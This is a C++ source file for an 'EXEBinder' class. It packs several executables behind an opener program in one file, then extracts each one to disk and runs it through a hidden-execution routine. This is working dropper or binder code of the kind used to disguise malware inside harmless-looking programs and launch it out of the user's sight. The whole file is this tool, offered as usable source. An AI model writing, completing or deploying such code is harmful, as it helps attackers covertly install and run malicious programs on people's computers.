#include "EXEBinder.h"

EXEBinder::EXEBinder() {}

EXEBinder::~EXEBinder() {}

void EXEBinder::Bind(const std::vector<std::string>& files, const std::string& fileBinded, const std::string& fileOpener) {
	if(!Miscellaneous::FileExists(fileOpener) || !files.size() || fileBinded.empty()) {
		return;
	}

	std::ofstream ofs(fileBinded, std::ios::binary);
	ofs << std::ifstream(fileOpener, std::ios::binary).rdbuf() << SEPARATOR;

	size_t index = files.size();
	for(auto& file : files) {
		ofs << std::ifstream(file, std::ios::binary).rdbuf();

		if(--index) {
			ofs << SEPARATOR;
		}
	}
}

void EXEBinder::Open(const std::string& file) {
	if(!Miscellaneous::FileExists(file)) {
		return;
	}

	std::string data;
	Miscellaneous::FileAsString(file, data);

	std::vector<size_t> occurancesPoss;
	Miscellaneous::FindAllOccurrences(data, SEPARATOR, occurancesPoss);

	for(size_t i = 1; i < occurancesPoss.size() - 1; i++) {
		std::string exeName(std::to_string(Miscellaneous::TSAsLL()));

		std::ofstream ofs(exeName, std::ios::binary);
		size_t exeStart = occurancesPoss[i] + SEPARATOR_SIZE;
		ofs << data.substr(exeStart, occurancesPoss[i + 1] - exeStart);

		ExecuteAndHide(exeName.c_str(), true);
	}

	std::string exeName(std::to_string(Miscellaneous::TSAsLL()));

	std::ofstream ofs(exeName, std::ios::binary);
	ofs << data.substr(occurancesPoss.back() + SEPARATOR_SIZE);

	ExecuteAndHide(exeName.c_str(), true);
}